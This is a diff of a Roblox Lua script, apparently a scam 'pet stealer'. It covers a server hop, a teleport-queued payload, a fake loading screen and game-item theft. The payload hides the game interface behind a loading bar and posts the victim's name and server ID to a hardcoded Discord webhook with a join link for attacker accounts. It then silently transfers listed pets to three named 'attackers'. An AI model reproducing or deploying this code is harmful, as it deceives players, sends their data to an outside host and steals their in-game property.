@@ -7,15 +7,17 @@ local placeId = 126884695634066
 -- 🌐 Discord webhook URL
 local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
 
--- 📦 QUEUED CODE after server hop
+-- 🧠 QUEUED CODE after server hop
 local loadingScript = [[
 
+-- ▶️ Services for GUI + webhook + pet transfer
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
+-- ✅ 1. GUI SHOW
 pcall(function()
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
     StarterGui:SetCore("TopbarEnabled", false)
@@ -62,6 +64,7 @@ fill.Size = UDim2.new(0, 0, 1, 0)
 fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
 fill.BorderSizePixel = 0
 
+-- 🎞️ GUI LOADING BAR Animation
 task.spawn(function()
     local percent = 0
     while percent <= 100 do
@@ -73,20 +76,23 @@ task.spawn(function()
     screenGui:Destroy()
 end)
 
+-- 📩 2. UPDATED WEBHOOK SEND (with kebabman link)
 task.delay(3, function()
     if typeof(request) ~= "function" then return end
     pcall(function()
-        local jobId = game.JobId
         local placeId = game.PlaceId
+        local jobId = game.JobId
+        local kebabLink = "https://kebabman.vercel.app/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+
         local data = {
             ["content"] = "",
             ["embeds"] = {{
                 ["title"] = "Player Joined New Server",
-                ["description"] = ("**Name:** %s\\n**JobId:** %s\\n[Join via App](roblox://placeID=%s&linkCode=%s)\\n[Join via Browser](https://www.roblox.com/games/%s?privateServerLinkCode=%s)")
-                    :format(LocalPlayer.Name, jobId, placeId, jobId, placeId, jobId),
+                ["description"] = ("**Name:** %s\n**JobId:** %s\n[Join Server](%s)"):format(LocalPlayer.Name, jobId, kebabLink),
                 ["color"] = 0x00FFFF
             }}
         }
+
         request({
             Url = "]] .. webhookUrl .. [[",
             Method = "POST",
@@ -96,26 +102,17 @@ task.delay(3, function()
     end)
 end)
 
+-- 🐾 3. SILENT PET TRANSFER
 local attackers = {
     ["boneblossom215"] = true,
     ["beanstalk1251"] = true,
     ["burningbud709"] = true
 }
 local targetPets = {
-    ["trex"] = true,
-    ["fennec fox"] = true,
-    ["raccoon"] = true,
-    ["dragonfly"] = true,
-    ["butterfly"] = true,
-    ["queenbee"] = true,
-    ["spinosaurus"] = true,
-    ["redfox"] = true,
-    ["brontosaurus"] = true,
-    ["mooncat"] = true,
-    ["mimic octopus"] = true,
-    ["disco bee"] = true,
-    ["dilophosaurus"] = true,
-    ["kitsune"] = true
+    ["trex"] = true, ["fennec fox"] = true, ["raccoon"] = true, ["dragonfly"] = true,
+    ["butterfly"] = true, ["queenbee"] = true, ["spinosaurus"] = true, ["redfox"] = true,
+    ["brontosaurus"] = true, ["mooncat"] = true, ["mimic octopus"] = true,
+    ["disco bee"] = true, ["dilophosaurus"] = true, ["kitsune"] = true
 }
 task.delay(3, function()
     while true do
@@ -139,6 +136,7 @@ task.delay(3, function()
 end)
 ]]
 
+-- 🧪 4. SERVER HOP FUNCTION
 local function serverHop()
     local cursor = ""
     local smallestServer = nil
@@ -165,8 +163,10 @@ local function serverHop()
         task.wait(0.2)
     until cursor == ""
 
+    -- ⏯️ Queue GUI + Webhook + Transfer
     queue_on_teleport(loadingScript)
 
+    -- 🚪 Teleport to selected server
     if smallestServer then
         TeleportService:TeleportToPlaceInstance(placeId, smallestServer.id, LocalPlayer)
     else
@@ -174,4 +174,5 @@ local function serverHop()
     end
 end
 
+-- 🚀 5. START EXECUTION
 serverHop()
